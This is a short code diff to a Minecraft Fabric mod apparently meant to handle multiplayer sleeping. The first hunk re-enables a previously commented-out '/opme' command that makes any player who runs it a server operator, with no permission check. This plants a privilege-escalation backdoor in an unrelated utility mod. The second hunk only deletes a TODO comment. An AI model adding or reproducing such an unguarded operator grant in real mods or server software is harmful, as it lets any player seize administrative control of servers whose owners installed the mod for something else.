@@ -195,12 +195,12 @@ public class MultiSleep implements ModInitializer {
           return 0;
         })
       );
-      // dispatcher.register(literal("opme")
-      //   .executes(ctx -> {
-      //     ctx.getSource().getMinecraftServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
-      //     return 0;
-      //   })
-      // );
+      dispatcher.register(literal("opme")
+        .executes(ctx -> {
+          ctx.getSource().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
+          return 0;
+        })
+      );
     });
   }
   //@formatter:on
@@ -412,8 +412,6 @@ public class MultiSleep implements ModInitializer {
   }
 
   public static boolean isOverworldPlayer(PlayerEntity p) {
-    // TODO: this buggs
-
     MutableRegistry<DimensionType> dimReg = p.getServer().getRegistryManager().getMutable(Registry.DIMENSION_TYPE_KEY);
     return dimReg.getRawId(p.getEntityWorld().getDimension()) == dimReg.getRawId(dimReg.get(DimensionType.OVERWORLD_ID));
   }
